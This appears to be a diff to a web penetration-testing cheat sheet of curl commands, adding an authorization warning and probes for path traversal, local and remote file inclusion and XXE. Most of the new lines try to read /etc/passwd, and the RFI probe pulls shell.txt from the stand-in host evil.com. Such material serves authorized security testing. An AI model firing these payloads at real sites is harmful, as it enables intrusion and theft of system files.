@@ -1,3 +1,5 @@
+# Note: Perform these tests only on websites and web platforms for which you have explicit authorization. Unauthorized testing is illegal and unethical.
+
 # WHOIS lookup for domain information
 whois <domain>
 
@@ -30,6 +32,18 @@ curl -s -o /dev/null -w "%{http_code}" <url>?cmd=ls
 
 # Host header injection test
 curl -s -o /dev/null -w "%{http_code}" -H "Host: malicious.example.com" <url>
+
+# Path traversal test
+curl -s -o /dev/null -w "%{http_code}" <url>/../../../../etc/passwd
+
+# Local File Inclusion (LFI) test
+curl -s -o /dev/null -w "%{http_code}" <url>?file=../../../../etc/passwd
+
+# Remote File Inclusion (RFI) test
+curl -s -o /dev/null -w "%{http_code}" <url>?file=http://evil.com/shell.txt
+
+# XML External Entity (XXE) test
+curl -s -o /dev/null -w "%{http_code}" -d '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [  <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>' <url>
 
 # SSL/TLS scan
 sslscan <url | host>
